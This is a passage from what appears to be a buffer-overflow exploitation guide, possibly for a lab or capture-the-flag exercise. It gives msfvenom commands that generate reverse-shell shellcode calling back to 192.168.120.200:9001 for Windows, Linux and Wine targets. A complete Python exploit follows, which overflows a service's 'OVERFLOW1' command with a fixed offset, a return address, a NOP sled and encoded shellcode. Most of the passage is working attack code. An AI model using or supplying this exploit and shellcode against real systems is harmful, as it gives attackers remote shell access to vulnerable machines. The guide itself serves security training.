# 6. Generating the shellcode

 ### Windows:  
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.120.200 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00"
```  

### Linux:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.120.200 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00"
```

### Linux / Wine:  
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.120.200 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00"  

# Not recommanded (You have to privesc from Wine)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.120.200 LPORT=9001 EXITFUNC=thread -f c -a x86 -b "\x00"  
```

## Example of Python3 code 
```python
#!/usr/bin/python3

import socket

ip = "10.10.2.75"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 200
payload = ("\xda\xdd\xbf\xee\x41\x06\xa4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x83\xc5\x04\x31\x7d\x13\x03\x93\x52\xe4\x51\x97\xbd\x6a"
"\x99\x67\x3e\x0b\x13\x82\x0f\x0b\x47\xc7\x20\xbb\x03\x85\xcc"
"\x30\x41\x3d\x46\x34\x4e\x32\xef\xf3\xa8\x7d\xf0\xa8\x89\x1c"
"\x72\xb3\xdd\xfe\x4b\x7c\x10\xff\x8c\x61\xd9\xad\x45\xed\x4c"
"\x41\xe1\xbb\x4c\xea\xb9\x2a\xd5\x0f\x09\x4c\xf4\x9e\x01\x17"
"\xd6\x21\xc5\x23\x5f\x39\x0a\x09\x29\xb2\xf8\xe5\xa8\x12\x31"
"\x05\x06\x5b\xfd\xf4\x56\x9c\x3a\xe7\x2c\xd4\x38\x9a\x36\x23"
"\x42\x40\xb2\xb7\xe4\x03\x64\x13\x14\xc7\xf3\xd0\x1a\xac\x70"
"\xbe\x3e\x33\x54\xb5\x3b\xb8\x5b\x19\xca\xfa\x7f\xbd\x96\x59"
"\xe1\xe4\x72\x0f\x1e\xf6\xdc\xf0\xba\x7d\xf0\xe5\xb6\xdc\x9d"
"\xca\xfa\xde\x5d\x45\x8c\xad\x6f\xca\x26\x39\xdc\x83\xe0\xbe"
"\x23\xbe\x55\x50\xda\x41\xa6\x79\x19\x15\xf6\x11\x88\x16\x9d"
"\xe1\x35\xc3\x32\xb1\x99\xbc\xf2\x61\x5a\x6d\x9b\x6b\x55\x52"
"\xbb\x94\xbf\xfb\x56\x6f\x28\x0e\xae\x7c\x33\x66\xb2\x82\x60"
"\x5e\x3b\x64\x0c\xb0\x6d\x3f\xb9\x29\x34\xcb\x58\xb5\xe2\xb6"
"\x5b\x3d\x01\x47\x15\xb6\x6c\x5b\xc2\x36\x3b\x01\x45\x48\x91"
"\x2d\x09\xdb\x7e\xad\x44\xc0\x28\xfa\x01\x36\x21\x6e\xbc\x61"
"\x9b\x8c\x3d\xf7\xe4\x14\x9a\xc4\xeb\x95\x6f\x70\xc8\x85\xa9"
"\x79\x54\xf1\x65\x2c\x02\xaf\xc3\x86\xe4\x19\x9a\x75\xaf\xcd"
"\x5b\xb6\x70\x8b\x63\x93\x06\x73\xd5\x4a\x5f\x8c\xda\x1a\x57"
"\xf5\x06\xbb\x98\x2c\x83\xdb\x7a\xe4\xfe\x73\x23\x6d\x43\x1e"
"\xd4\x58\x80\x27\x57\x68\x79\xdc\x47\x19\x7c\x98\xcf\xf2\x0c"
"\xb1\xa5\xf4\xa3\xb2\xef")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```